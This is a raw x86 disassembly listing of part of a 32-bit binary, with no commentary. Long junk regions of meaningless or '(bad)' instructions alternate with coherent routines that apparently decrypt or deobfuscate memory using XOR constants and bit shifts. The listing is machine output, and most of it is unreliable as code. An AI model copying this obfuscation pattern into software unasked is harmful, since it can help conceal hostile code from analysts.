  409418:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409419:	hlt    
  40941a:	pop    eax
  40941b:	stc    
  40941c:	inc    ebx
  40941d:	and    edx,ebp
  40941f:	out    0x23,al
  409421:	or     eax,0x76fb289d
  409426:	push   ecx
  409427:	mov    al,ds:0xeab2bfc6
  40942c:	fucomp st(0)
  40942e:	mov    edi,DWORD PTR [eax]
  409430:	mov    DWORD PTR [ebp-0x269ec33],edi
  409436:	data16 daa 
  409438:	(bad)  
  409439:	ja     0x40949c
  40943b:	lds    esp,FWORD PTR [ecx+0x4d5a545b]
  409441:	clc    
  409442:	shl    BYTE PTR [eax+0x75],0xd3
  409446:	dec    esp
  409447:	fisub  DWORD PTR [ebp+0x24]
  40944a:	jmp    0x6cbe3046
  40944f:	and    DWORD PTR [eax+0x3e],esp
  409452:	adc    al,0x85
  409454:	popa   
  409455:	aas    
  409456:	outs   dx,DWORD PTR ds:[esi]
  409457:	ret    
  409458:	and    dl,bl
  40945a:	in     al,dx
  40945b:	in     al,dx
  40945c:	ins    BYTE PTR es:[edi],dx
  40945d:	mov    al,ds:0xc6dec96
  409462:	pop    esp
  409463:	mov    ah,0x79
  409465:	jmp    0xa0c0:0x90a6ca2
  40946c:	xchg   DWORD PTR [esi+0x2c],esi
  40946f:	push   esi
  409470:	in     al,0xbf
  409472:	push   ecx
  409473:	jae    0x409406
  409475:	inc    ecx
  409476:	cdq    
  409477:	ins    BYTE PTR es:[edi],dx
  409478:	jp     0x4094e7
  40947a:	stc    
  40947b:	popa   
  40947c:	ror    BYTE PTR ds:0xd10fa4ba,1
  409482:	dec    edi
  409483:	xchg   esi,eax
  409484:	fild   WORD PTR [esi+0x11860718]
  40948a:	(bad)  
  40948b:	int    0xe9
  40948d:	mov    bl,bl
  40948f:	js     0x40948b
  409491:	int    0x77
  409493:	rol    DWORD PTR [eax-0x4f],0xc0
  409497:	dec    ebx
  409498:	(bad)  
  409499:	cmp    DWORD PTR [edi],edx
  40949b:	gs mov dl,0x7c
  40949e:	cmc    
  40949f:	mov    ds:0xf557c1a7,al
  4094a4:	adc    dh,ah
  4094a6:	mov    dh,0xf5
  4094a8:	popf   
  4094a9:	push   ebp
  4094aa:	xchg   esi,eax
  4094ab:	xor    eax,0x906bc945
  4094b0:	mov    edx,DWORD PTR [esi+ecx*8+0x78081a49]
  4094b7:	lahf   
  4094b8:	pusha  
  4094b9:	mov    ch,0x11
  4094bb:	ja     0x40951d
  4094bd:	pushf  
  4094be:	mov    edx,gs
  4094c0:	sub    esp,DWORD PTR [ecx-0x6f]
  4094c3:	lock xchg ebp,eax
  4094c5:	adc    al,0x2a
  4094c7:	xchg   esi,eax
  4094c8:	int    0x6c
  4094ca:	sbb    DWORD PTR [edx],ecx
  4094cc:	xchg   ebp,eax
  4094cd:	or     BYTE PTR [ecx],bh
  4094cf:	jae    0x4094fb
  4094d1:	ret    
  4094d2:	call   0x59d5:0xb7314895
  4094d9:	and    ecx,esi
  4094db:	sbb    DWORD PTR [ebp+0x18],0xffffffb9
  4094df:	adc    eax,0xacc4c59e
  4094e4:	(bad)  
  4094e5:	in     al,dx
  4094e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4094e7:	sbb    edi,DWORD PTR ds:0xa57f90ec
  4094ed:	fidiv  WORD PTR [ecx+0x22]
  4094f0:	cwde   
  4094f1:	mov    dh,0xd
  4094f3:	adc    BYTE PTR [ebp-0x6ff87f0a],dl
  4094f9:	dec    ecx
  4094fa:	adc    dh,BYTE PTR [esp+ebp*2+0x5f]
  4094fe:	jns    0x4094fa
  409500:	lods   eax,DWORD PTR ds:[esi]
  409501:	mov    edi,0x7e6516f1
  409506:	out    dx,eax
  409507:	mov    edx,0x472e975e
  40950c:	cld    
  40950d:	pop    es
  40950e:	popf   
  40950f:	fwait
  409510:	sub    ah,dh
  409512:	jo     0x4094dd
  409514:	popf   
  409515:	jmp    0xb9f3:0xf4515d71
  40951c:	add    eax,0x267f1f2
  409521:	lods   al,BYTE PTR ds:[esi]
  409522:	icebp  
  409523:	outs   dx,BYTE PTR ds:[esi]
  409524:	jb     0x409558
  409526:	fld    DWORD PTR [esi]
  409528:	xlat   BYTE PTR ds:[ebx]
  409529:	dec    esi
  40952a:	pushf  
  40952b:	mov    al,0x80
  40952e:	jno    0x40959a
  409530:	fistp  WORD PTR [esi-0x5cc97f7]
  409536:	sbb    DWORD PTR [eax+0x2bbcf445],0xffffffe3
  40953d:	sbb    eax,0x9b5c9e57
  409542:	mov    ss,WORD PTR [edi-0x48]
  409545:	xchg   ebx,eax
  409546:	js     0x4095b1
  409548:	pop    ss
  409549:	enterw 0xa30c,0xe5
  40954e:	pop    es
  40954f:	dec    ebp
  409550:	mov    bl,0x51
  409552:	inc    ebx
  409553:	xor    eax,0x1ad3f588
  409558:	cmp    edi,ecx
  40955a:	dec    edi
  40955b:	xchg   BYTE PTR ss:[edi-0x5b637f15],dh
  409562:	and    al,0xa0
  409564:	inc    edi
  409565:	or     bl,BYTE PTR [ebp-0x3c]
  409568:	les    edi,FWORD PTR [ebx+0x134becb5]
  40956e:	popf   
  40956f:	mov    ch,ch
  409571:	jne    0x409557
  409573:	nop
  409574:	jno    0x409584
  409576:	mov    ?,eax
  409578:	push   edi
  409579:	aaa    
  40957a:	cmp    BYTE PTR [edi],ah
  40957c:	pop    ds
  40957d:	mov    WORD PTR [edx],es
  40957f:	aam    0x32
  409581:	fdivr  DWORD PTR ds:0x618e2d29
  409587:	push   edx
  409588:	push   edi
  409589:	je     0x40957d
  40958b:	mov    ah,0x58
  40958d:	fsubr  DWORD PTR [esi-0x61b692b6]
  409593:	pop    edx
  409594:	sbb    eax,0x3e02454b
  409599:	mov    eax,0x166abbbd
  40959e:	mov    edx,0x160a12f7
  4095a3:	xor    DWORD PTR [edx+0x47],0xffffffc2
  4095a7:	int    0xc6
  4095a9:	call   0x1789af36
  4095ae:	push   0xffffffc7
  4095b0:	mov    edi,0xc77b7af
  4095b5:	inc    ebp
  4095b6:	and    DWORD PTR [esp+eiz*8],edx
  4095b9:	add    eax,0xb02ecf95
  4095be:	and    al,0x91
  4095c0:	enter  0xb5f9,0xa7
  4095c4:	and    dh,BYTE PTR [edi]
  4095c6:	scas   eax,DWORD PTR es:[edi]
  4095c7:	shr    BYTE PTR [eax-0x2d],1
  4095ca:	xor    DWORD PTR [edx+0x346d4ab4],ecx
  4095d0:	ins    BYTE PTR es:[edi],dx
  4095d1:	div    BYTE PTR [ebx+ebx*4-0x79]
  4095d5:	xor    ah,BYTE PTR [edx-0x61b475a5]
  4095db:	loope  0x409598
  4095dd:	inc    ebx
  4095de:	nop
  4095df:	mov    esi,edx
  4095e1:	inc    ebp
  4095e2:	test   BYTE PTR [ebx-0x16d25347],al
  4095e8:	xchg   ebx,eax
  4095e9:	inc    ebp
  4095ea:	sub    BYTE PTR [ebx+ecx*8-0x65],ah
  4095ee:	and    eax,0x8a9f0742
  4095f3:	dec    edi
  4095f4:	enter  0x12e6,0xd2
  4095f8:	in     eax,dx
  4095f9:	(bad)  
  4095fa:	scas   eax,DWORD PTR es:[edi]
  4095fb:	jnp    0x409581
  4095fd:	pop    esp
  4095fe:	out    0xcf,eax
  409600:	arpl   WORD PTR [edx],di
  409602:	aaa    
  409603:	cmp    eax,0xa6b43895
  409608:	ins    BYTE PTR es:[edi],dx
  409609:	push   ebx
  40960a:	pop    esp
  40960b:	cmp    eax,0x848c01df
  409610:	ss xchg ebp,eax
  409612:	jmp    0xabd04010
  409617:	std    
  409618:	or     ebx,DWORD PTR [ebx]
  40961a:	xlat   BYTE PTR ds:[ebx]
  40961b:	dec    edx
  40961c:	aad    0x40
  40961e:	shl    bl,0xac
  409621:	pop    edx
  409622:	fsub   QWORD PTR [edx]
  409624:	xchg   ecx,eax
  409625:	sbb    bl,BYTE PTR [eax+0x3b]
  409628:	or     dl,BYTE PTR [esi]
  40962a:	fisttp QWORD PTR [ebx+0x2e0c116]
  409630:	mov    DWORD PTR [ebp+0x10],edx
  409633:	mov    edx,DWORD PTR [esi+0x4]
  409636:	xor    eax,0xca79a575
  40963b:	mov    DWORD PTR [ebp+0x14],edx
  40963e:	cmp    eax,DWORD PTR [ebp+0x10]
  409641:	jne    0x4096f4
  409647:	mov    eax,edx
  409649:	cmp    DWORD PTR [ebp+0xc],eax
  40964c:	jne    0x4096f4
  409652:	mov    eax,DWORD PTR [esi]
  409654:	mov    edx,DWORD PTR [esi+0x4]
  409657:	mov    eax,DWORD PTR [esi]
  409659:	mov    edx,DWORD PTR [esi+0x4]
  40965c:	xor    eax,0xca79a577
  409661:	xor    edx,ecx
  409663:	mov    ecx,eax
  409665:	mov    eax,edx
  409667:	shrd   ecx,eax,0x2
  40966b:	shr    eax,0x2
  40966e:	mov    DWORD PTR [ebp+0xc],eax
  409671:	mov    eax,DWORD PTR [esi]
  409673:	mov    edx,DWORD PTR [esi+0x4]
  409676:	mov    edx,eax
  409678:	xor    eax,eax
  40967a:	or     eax,ecx
  40967c:	mov    ecx,DWORD PTR [ebx]
  40967e:	shl    edx,0x1e
  409681:	xor    edx,0x40000000
  409687:	mov    DWORD PTR [ebp+0x10],eax
  40968a:	mov    eax,edx
  40968c:	or     eax,DWORD PTR [ebp+0xc]
  40968f:	mov    edx,DWORD PTR [ebx+0x4]
  409692:	push   eax
  409693:	push   DWORD PTR [ebp+0x10]
  409696:	push   edx
  409697:	push   ecx
  409698:	call   0x416c20
  40969d:	mov    eax,DWORD PTR [esi]
  40969f:	mov    ecx,DWORD PTR [esi+0x4]
  4096a2:	shrd   eax,ecx,0x2
  4096a6:	shr    ecx,0x2
  4096a9:	shr    edx,0x1e
  4096ac:	xor    ecx,0xe706e27a
  4096b2:	push   ecx
  4096b3:	xor    eax,edi
  4096b5:	mov    DWORD PTR [ebp+0x10],edx
  4096b8:	mov    edx,DWORD PTR [ebx]
  4096ba:	mov    edi,DWORD PTR [ebx+0x4]
  4096bd:	push   eax
  4096be:	push   edi
  4096bf:	push   edx
  4096c0:	call   0x416c20
  4096c5:	shld   edx,eax,0x2
  4096c9:	mov    ecx,edx
  4096cb:	xor    edx,edx
  4096cd:	or     ecx,edx
  4096cf:	mov    edx,DWORD PTR [esi]
  4096d1:	mov    edi,DWORD PTR [esi+0x4]
  4096d4:	shl    eax,0x2
  4096d7:	or     eax,DWORD PTR [ebp+0x10]
  4096da:	xor    edi,ecx
  4096dc:	xor    edx,eax
  4096de:	xor    edx,0xca79a575
  4096e4:	xor    edi,0x9c1b89e8
  4096ea:	mov    DWORD PTR [esi],edx
  4096ec:	mov    DWORD PTR [esi+0x4],edi
  4096ef:	jmp    0x40a921
  4096f4:	mov    eax,DWORD PTR [ebp-0x24]
  4096f7:	add    eax,DWORD PTR [ebp-0x4]
  4096fa:	mov    DWORD PTR [ebp-0x28],eax
  4096fd:	mov    eax,DWORD PTR [ebp-0x28]
  409700:	mov    eax,DWORD PTR [ebp-0x4]
  409703:	mov    eax,DWORD PTR [ebp-0x28]
  409706:	mov    eax,DWORD PTR [eax+0xc]
  409709:	mov    edx,DWORD PTR [ebp-0x4]
  40970c:	movzx  eax,WORD PTR [edx+eax*1]
  409710:	cdq    
  409711:	shld   edx,eax,0x2
  409715:	xor    edx,ecx
  409717:	mov    DWORD PTR [ebp+0xc],edx
  40971a:	mov    edx,DWORD PTR [ebp-0x58]
  40971d:	shl    eax,0x2
  409720:	mov    DWORD PTR [ebp+0x10],edx
  409723:	mov    edx,DWORD PTR [ebp-0x54]
  409726:	xor    eax,0xca79a575
  40972b:	mov    DWORD PTR [ebp+0x14],edx
  40972e:	cmp    eax,DWORD PTR [ebp+0x10]
  409731:	jne    0x40a0d1
  409737:	mov    eax,edx
  409739:	cmp    DWORD PTR [ebp+0xc],eax
  40973c:	jne    0x40a0d1
  409742:	mov    DWORD PTR [ebp+0x8],0xca79a575
  409749:	mov    DWORD PTR [ebp+0xc],ecx
  40974c:	mov    DWORD PTR [ebp-0x60],0xca79a571
  409753:	mov    DWORD PTR [ebp-0x5c],ecx
  409756:	mov    DWORD PTR [ebp-0x48],0xca79a57d
  40975d:	mov    DWORD PTR [ebp-0x44],ecx
  409760:	mov    DWORD PTR [ebp-0x38],0xca79a579
  409767:	mov    DWORD PTR [ebp-0x34],ecx
  40976a:	mov    eax,DWORD PTR [ebp+0x8]
  40976d:	mov    ecx,DWORD PTR [ebp+0xc]
  409770:	shrd   eax,ecx,0x2
  409774:	shr    ecx,0x2
  409777:	mov    ecx,DWORD PTR [ebp+0x8]
  40977a:	mov    edx,DWORD PTR [ebp+0xc]
  40977d:	xor    eax,edi
  40977f:	shl    ecx,0x1e
  409782:	xor    edx,edx
  409784:	or     eax,edx
  409786:	add    eax,DWORD PTR ds:0x422578
  40978c:	mov    DWORD PTR [ebp+0x14],eax
  40978f:	mov    eax,DWORD PTR [ebp+0x8]
  409792:	mov    ecx,DWORD PTR [ebp+0xc]
  409795:	shrd   eax,ecx,0x2
  409799:	shr    ecx,0x2
  40979c:	mov    ecx,DWORD PTR [ebp+0x8]
  40979f:	mov    edx,DWORD PTR [ebp+0xc]
  4097a2:	xor    eax,edi
  4097a4:	shl    ecx,0x1e
  4097a7:	xor    edx,edx
  4097a9:	or     eax,edx
  4097ab:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  4097af:	mov    eax,DWORD PTR [ebp+0x14]
  4097b2:	xor    BYTE PTR [eax],cl
  4097b4:	mov    eax,DWORD PTR [ebp-0x60]
  4097b7:	mov    ecx,DWORD PTR [ebp-0x5c]
  4097ba:	shrd   eax,ecx,0x2
  4097be:	shr    ecx,0x2
  4097c1:	mov    ecx,DWORD PTR [ebp-0x60]
  4097c4:	mov    edx,DWORD PTR [ebp-0x5c]
  4097c7:	xor    eax,edi
  4097c9:	shl    ecx,0x1e
  4097cc:	jmp    0x409baa
  4097d1:	or     bh,dh
  4097d3:	cmp    BYTE PTR [esi-0x6574e1dc],dh
  4097d9:	mov    esi,0x71bca5c6
  4097de:	in     eax,dx
  4097df:	xchg   ebp,eax
  4097e0:	mov    esp,0x18184147
  4097e5:	sahf   
  4097e6:	adc    bl,BYTE PTR [eax]
  4097e8:	sbb    BYTE PTR [eax],ah
  4097ea:	mov    al,BYTE PTR [eax]
  4097ec:	fistp  QWORD PTR [edx+0x519c9920]
  4097f2:	mov    ds:0x7a7b371,eax
  4097f7:	mov    bl,0x76
  4097f9:	enter  0x115a,0x37
  4097fd:	imul   esp,DWORD PTR [ecx+0x21],0xffffffcf
  409801:	mov    eax,0xe0223953
  409806:	sbb    DWORD PTR gs:[ebp-0x6058bc2a],0xd17b66f6
  409811:	je     0x40979e
  409813:	or     al,bl
  409815:	sahf   
  409816:	pop    es
  409817:	adc    dh,0xb4
  40981a:	add    al,BYTE PTR [ecx-0x6c]
  40981d:	and    DWORD PTR [eax-0x187749f0],edx
  409823:	in     eax,dx
  409824:	retf   0x7fdf
  409827:	mov    esi,0x4762b152
  40982c:	leave  
  40982d:	cdq    
  40982e:	push   edx
  40982f:	gs pop ebx
  409831:	jl     0x409840
  409833:	pop    eax
  409834:	outs   dx,BYTE PTR ds:[esi]
  409835:	mov    DWORD PTR [ebp-0x404beb37],edi
  40983b:	mov    ds:0x48543159,al
  409840:	or     edi,esp
  409842:	or     edi,DWORD PTR [esi+0x2a0bce5e]
  409848:	inc    edx
  409849:	and    eax,0x9ca62b16
  40984e:	mov    al,ds:0x6bf83e9a
  409853:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409854:	sar    BYTE PTR [ebx-0x389cc789],cl
  40985a:	loopne 0x40980f
  40985c:	shl    BYTE PTR [esi*1-0x28a6b2df],cl
  409863:	scas   al,BYTE PTR es:[edi]
  409864:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409865:	jb     0x409852
  409867:	jmp    0x40f3:0x20ab0fbf
  40986e:	push   edx
  40986f:	mov    ecx,0x15ed1a73
  409874:	and    BYTE PTR [eax+0x58],0x6a
  409878:	dec    ebx
  409879:	scas   al,BYTE PTR es:[edi]
  40987a:	cs (bad) 
  40987c:	das    
  40987d:	icebp  
  40987e:	pusha  
  40987f:	cmp    al,0xcb
  409881:	xchg   dh,ah
  409883:	mov    BYTE PTR [edi+0x48],bh
  409886:	adc    ah,bh
  409888:	pop    ebp
  409889:	imul   edi,DWORD PTR [eax+0x4d],0xfffffffd
  40988d:	jns    0x409827
  40988f:	push   0x8d4fe557
  409894:	lahf   
  409895:	mov    al,0x75
  409897:	mov    dh,0x90
  409899:	out    dx,eax
  40989a:	scas   al,BYTE PTR es:[edi]
  40989b:	cmp    dh,BYTE PTR [edi]
  40989d:	or     esi,ebp
  40989f:	or     DWORD PTR [edx+0x5543bc34],edi
  4098a5:	ficom  DWORD PTR [ebx+0x49]
  4098a8:	mov    ds:0x873bc358,al
  4098ad:	or     eax,edi
  4098af:	cmp    al,0xd4
  4098b1:	scas   eax,DWORD PTR es:[edi]
  4098b2:	in     eax,dx
  4098b3:	aad    0x4
  4098b5:	cmp    eax,0x8644671b
  4098ba:	mov    esp,DWORD PTR [edx-0x2bc6eff9]
  4098c0:	inc    eax
  4098c1:	xor    BYTE PTR [eax],0x38
  4098c4:	pop    ss
  4098c5:	or     DWORD PTR [ebp-0x20a73bd7],esp
  4098cb:	xor    al,BYTE PTR [edx+0x2bfb354c]
  4098d1:	popf   
  4098d2:	ret    
  4098d3:	and    al,0xa3
  4098d5:	into   
  4098d6:	int3   
  4098d7:	jmp    0x409933
  4098d9:	fnstsw WORD PTR [edx+0x64]
  4098dc:	pop    ecx
  4098dd:	fimul  DWORD PTR [ecx+0x2f]
  4098e0:	mov    esi,0x73f17fc6
  4098e6:	dec    esp
  4098e7:	test   ch,cl
  4098e9:	add    edi,ecx
  4098eb:	loope  0x409930
  4098ed:	repnz dec ebx
  4098ef:	retf   
  4098f0:	sub    esi,DWORD PTR [eax-0x1f]
  4098f3:	pop    ecx
  4098f4:	mov    cl,0x8d
  4098f6:	in     eax,dx
  4098f7:	fs add eax,0xe2e12f6f
  4098fd:	outs   dx,DWORD PTR ds:[esi]
  4098fe:	call   0x258b87a0
  409903:	fmul   DWORD PTR [ebx-0x27]
  409906:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409907:	or     BYTE PTR [ebx-0x1e14ca83],al
  40990d:	mov    esp,0x27bae2ed
  409912:	jns    0x4098d5
  409914:	pop    ebx
  409915:	mov    ch,0xda
  409917:	dec    ebx
  409918:	mov    dh,0xf
  40991a:	std    
  40991b:	or     BYTE PTR [esp+edx*8],0x2b
  40991f:	icebp  
  409920:	mov    ebp,0x53aaf6e7
  409925:	pop    ebx
  409926:	scas   eax,DWORD PTR es:[edi]
  409927:	addr16 repnz xor eax,0x998c0dfc
  40992e:	sub    al,0x98
  409930:	adc    dl,BYTE PTR [ecx+0x1f]
  409933:	stos   DWORD PTR es:[edi],eax
  409934:	sti    
  409935:	or     al,0x9f
  409937:	ins    BYTE PTR es:[edi],dx
  409938:	push   esi
  409939:	adc    bh,BYTE PTR [ecx-0x65f554d8]
  40993f:	(bad)  
  409940:	in     al,0xc
  409942:	arpl   WORD PTR [esi+eiz*4+0x4c],di
  409946:	fwait
  409947:	(bad)  
  409948:	aas    
  409949:	int3   
  40994a:	cdq    
  40994b:	stos   BYTE PTR es:[edi],al
  40994c:	or     edx,DWORD PTR [edi]
  40994e:	mov    bh,0x73
  409950:	jmp    0x409997
  409952:	push   ds
  409953:	mov    al,ds:0xfd154e5e
  409958:	or     DWORD PTR [edx],ecx
  40995a:	ficomp DWORD PTR [ebp+0x7c]
  40995d:	pop    edi
  40995e:	dec    esi
  40995f:	hlt    
  409960:	push   edi
  409961:	outs   dx,BYTE PTR ds:[esi]
  409962:	mov    eax,DWORD PTR [ebp-0x3a]
  409965:	sub    eax,0x641f927e
  40996a:	mov    al,ds:0xd54c20de
  40996f:	repz mov esi,0x7b3d8cf2
  409975:	sti    
  409976:	loopne 0x4099b8
  409978:	push   esp
  409979:	int3   
  40997a:	aam    0x80
  40997c:	daa    
  40997d:	or     cl,0xe9
  409980:	mov    DWORD PTR [edi],eax
  409982:	shl    BYTE PTR [esi+0x3a],1
  409985:	mov    ebp,0x53cae88f
  40998a:	in     al,dx
  40998b:	dec    ecx
  40998c:	mov    ebp,0x5e9d9c2c
  409991:	imul   edx,esp,0x1d0ea492
  409997:	je     0x409972
  409999:	or     edx,ecx
  40999b:	push   ecx
  40999c:	cmp    al,0x6f
  40999e:	dec    edi
  40999f:	pop    ecx
  4099a0:	add    al,0x3c
  4099a2:	jle    0x4099d5
  4099a4:	cld    
  4099a5:	out    0xac,eax
  4099a7:	fdivr  DWORD PTR [esi+ebx*8-0x20]
  4099ab:	sub    al,0xa9
  4099ad:	arpl   WORD PTR [ecx-0x15bbd4bc],ax
  4099b3:	mov    edi,0x587ad36c
  4099b8:	cmp    BYTE PTR [ebp+0x4b9d4f43],0x68
  4099bf:	mov    edx,0xabbd9bec
  4099c4:	inc    ecx
  4099c5:	inc    esi
  4099c6:	call   0x6f3ecda8
  4099cb:	out    dx,al
  4099cc:	stos   BYTE PTR es:[edi],al
  4099cd:	push   es
  4099ce:	out    dx,eax
  4099cf:	push   esp
  4099d0:	addr16 in al,0x83
  4099d3:	xor    DWORD PTR [edx],edx
  4099d5:	jo     0x409973
  4099d7:	or     DWORD PTR [edi],ebx
  4099d9:	inc    ebx
  4099da:	out    0x7f,al
  4099dc:	std    
  4099dd:	in     al,dx
  4099de:	xor    eax,0xf53bc973
  4099e3:	adc    esp,ebp
  4099e5:	jp     0x409985
  4099e7:	sub    ecx,DWORD PTR [ebx+edx*8]
  4099ea:	cwde   
  4099eb:	shl    DWORD PTR [esi-0x62],0x95
  4099ef:	push   ebx
  4099f0:	mov    WORD PTR [eax+ecx*4+0x6cafab15],?
  4099f7:	rcl    ebp,cl
  4099f9:	ret    0x49ae
  4099fc:	sub    ebp,DWORD PTR [ebp-0x28e4408a]
  409a02:	xor    eax,0xb3ed80dc
  409a07:	lods   al,BYTE PTR ds:[esi]
  409a08:	rcr    BYTE PTR [ebx+0x54542fa5],1
  409a0e:	aam    0x92
  409a10:	adc    al,0xdf
  409a12:	repz push edi
  409a14:	pop    ebx
  409a15:	pop    es
  409a16:	dec    ebx
  409a17:	out    dx,al
  409a18:	shl    DWORD PTR [esp+ebp*8-0x7e],0x24
  409a1d:	and    esi,DWORD PTR [edx+ebx*2-0x77675f13]
  409a24:	faddp  st(4),st
  409a26:	sbb    esi,DWORD PTR [edi]
  409a28:	in     al,0xa7
  409a2a:	(bad)  
  409a2b:	ss push cs
  409a2d:	xchg   ecx,eax
  409a2e:	adc    BYTE PTR [ecx],0x52
  409a31:	and    DWORD PTR [esi+0x3fa6cc9a],edx
  409a37:	ret    
  409a38:	or     BYTE PTR [ecx-0x1cae0e7f],ah
  409a3e:	loope  0x409a98
  409a40:	jl     0x409a02
  409a42:	mov    cl,0xa2
  409a44:	test   DWORD PTR [edi+0x29],esi
  409a47:	(bad)  
  409a49:	and    al,0x76
  409a4b:	(bad)  
  409a4c:	jae    0x409a9a
  409a4e:	push   es
  409a4f:	int    0x86
  409a51:	mov    DWORD PTR [esi+0x11],ebp
  409a54:	mov    fs,WORD PTR [ebx+eiz*1-0x14c46e8f]
  409a5b:	fisub  WORD PTR [edx+ebx*8-0x3918c32b]
  409a62:	aam    0xe0
  409a64:	sub    eax,DWORD PTR [edx+0x1f014e3f]
  409a6a:	jecxz  0x409a23
  409a6c:	fs aam 0x59
  409a6f:	add    DWORD PTR [edi-0x53],0x62
  409a73:	cmp    dh,cl
  409a75:	jbe    0x409a83
  409a77:	jle    0x409a79
  409a79:	fs xchg edi,eax
  409a7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a7c:	out    dx,al
  409a7d:	fmul   st,st(2)
  409a7f:	adc    eax,0x608ea9bf
  409a84:	mov    esp,0x60495210
  409a89:	and    DWORD PTR [ebp+0x611bec10],esp
  409a8f:	mov    edi,0xfcf2cf69
  409a94:	scas   al,BYTE PTR es:[edi]
  409a95:	mov    al,0x4a
  409a97:	mov    esi,0xb32e7595
  409a9c:	test   ch,bl
  409a9e:	pop    edx
  409a9f:	mov    al,0x58
  409aa1:	sbb    esp,DWORD PTR [ebp+edi*4-0x312540a7]
  409aa8:	inc    edi
  409aa9:	dec    ecx
  409aaa:	cdq    
  409aab:	stos   BYTE PTR es:[edi],al
  409aac:	xchg   BYTE PTR [esi],dh
  409aae:	xchg   BYTE PTR [bp+si-0x28],bl
  409ab2:	ds aad 0xe5
  409ab5:	bound  edi,QWORD PTR [edi]
  409ab7:	mov    ecx,0x9654c0b4
  409abc:	adc    ecx,esp
  409abe:	xchg   ecx,eax
  409abf:	int3   
  409ac0:	stos   DWORD PTR es:[edi],eax
  409ac1:	xlat   BYTE PTR ds:[ebx]
  409ac2:	mov    ds:0x29ec9dda,eax
  409ac7:	loope  0x409aa2
  409ac9:	or     ebx,DWORD PTR [esp]
  409acc:	xlat   BYTE PTR ds:[ebx]
  409acd:	outs   dx,BYTE PTR ds:[esi]
  409ace:	or     al,0x55
  409ad0:	ins    BYTE PTR es:[edi],dx
  409ad1:	add    eax,0xc68e3459
  409ad6:	jo     0x409a7c
  409ad8:	std    
  409ad9:	mov    WORD PTR [edi],?
  409adb:	pcmpeqw mm0,QWORD PTR [ebp-0x78]
  409adf:	push   ss
  409ae0:	int    0x52
  409ae2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ae3:	mov    ah,BYTE PTR [eax-0x1]
  409ae6:	jmp    0x409b31
  409ae8:	hlt    
  409ae9:	int    0xc7
  409aeb:	and    eax,0x3beb29cb
  409af0:	addr16 (bad) 
  409af2:	cmp    bl,dl
  409af4:	test   al,0x17
  409af6:	xchg   edi,eax
  409af7:	mov    esi,0xe37960df
  409afc:	lods   al,BYTE PTR ds:[esi]
  409afd:	pushf  
  409afe:	(bad)  
  409aff:	rcr    DWORD PTR [edi+0x56],1
  409b02:	mov    ch,0x2e
  409b04:	xor    al,0x90
  409b06:	sub    eax,0x3b069d66
  409b0b:	mov    eax,eax
  409b0d:	and    BYTE PTR [eax],al
  409b0f:	pop    ebx
  409b10:	sub    DWORD PTR [edi+0x3327585],eax
  409b16:	xor    eax,0x13b79854
  409b1b:	jge    0x409b37
  409b1d:	and    al,0x9
  409b1f:	adc    esi,DWORD PTR [edi+0x18]
  409b22:	mov    eax,ds:0x1bb26c71
  409b27:	loopne 0x409b4b
  409b29:	stos   BYTE PTR es:[edi],al
  409b2a:	retf   
  409b2b:	ins    DWORD PTR es:[edi],dx
  409b2c:	repz xor ecx,esp
  409b2f:	(bad)  
  409b30:	in     eax,0xb9
  409b32:	mov    esi,0x63a4f41b
  409b37:	push   ebp
  409b38:	add    edx,edi
  409b3a:	lea    ebp,[edx-0x1de1a7f3]
  409b40:	mov    ds:0xfaa38464,eax
  409b45:	cwde   
  409b46:	shl    bh,1
  409b48:	lea    ebp,[eax+0x29]
  409b4b:	mov    es,WORD PTR [ecx-0x64]
  409b4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b4f:	mov    ds:0x1f2097f5,al
  409b54:	lods   eax,DWORD PTR ds:[esi]
  409b55:	nop
  409b56:	and    al,0x4b
  409b58:	(bad)  
  409b59:	fmul   DWORD PTR [edx+0x5]
  409b5c:	mov    eax,ds:0xa4bd8e06
  409b61:	xchg   DWORD PTR [ebx+edi*1+0x7784d9b3],eax
  409b68:	pop    es
  409b69:	out    dx,eax
  409b6a:	sub    edx,DWORD PTR [eax+0x5b]
  409b6d:	fidiv  WORD PTR [ecx]
  409b6f:	xor    eax,ecx
  409b71:	sbb    eax,0x97d7ccb0
  409b76:	ins    DWORD PTR es:[edi],dx
  409b77:	rep ins BYTE PTR es:[edi],dx
  409b79:	dec    ebx
  409b7a:	pusha  
  409b7b:	inc    edx
  409b7c:	xchg   eax,esi
  409b7e:	sahf   
  409b7f:	out    dx,al
  409b80:	loope  0x409bd4
  409b82:	and    al,0x31
  409b84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b85:	jo     0x409b6b
  409b87:	push   eax
  409b88:	pop    es
  409b89:	xor    ah,BYTE PTR [ecx]
  409b8b:	aad    0x5f
  409b8d:	cmp    esi,DWORD PTR [edx+0x26]
  409b90:	push   0x52
  409b92:	cmp    esp,DWORD PTR [ecx+0x6be149d9]
  409b98:	ret    0xc4c5
  409b9b:	push   ebp
  409b9c:	jg     0x409b7f
  409b9e:	sub    eax,0xee7b0864
  409ba3:	cmp    ecx,ecx
  409ba5:	jle    0x409be7
  409ba7:	cwde   
  409ba8:	js     0x409beb
  409baa:	xor    edx,edx
  409bac:	or     eax,edx
  409bae:	add    eax,DWORD PTR ds:0x422578
  409bb4:	mov    DWORD PTR [ebp+0x14],eax
  409bb7:	mov    eax,DWORD PTR [ebp-0x60]
  409bba:	mov    ecx,DWORD PTR [ebp-0x5c]
  409bbd:	shrd   eax,ecx,0x2
  409bc1:	shr    ecx,0x2
  409bc4:	mov    ecx,DWORD PTR [ebp-0x60]
  409bc7:	mov    edx,DWORD PTR [ebp-0x5c]
  409bca:	xor    eax,edi
  409bcc:	shl    ecx,0x1e
  409bcf:	xor    edx,edx
  409bd1:	or     eax,edx
  409bd3:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  409bd7:	mov    eax,DWORD PTR [ebp+0x14]
  409bda:	or     BYTE PTR [eax],cl
  409bdc:	mov    eax,DWORD PTR [ebp-0x48]
  409bdf:	mov    ecx,DWORD PTR [ebp-0x44]
  409be2:	shrd   eax,ecx,0x2
  409be6:	shr    ecx,0x2
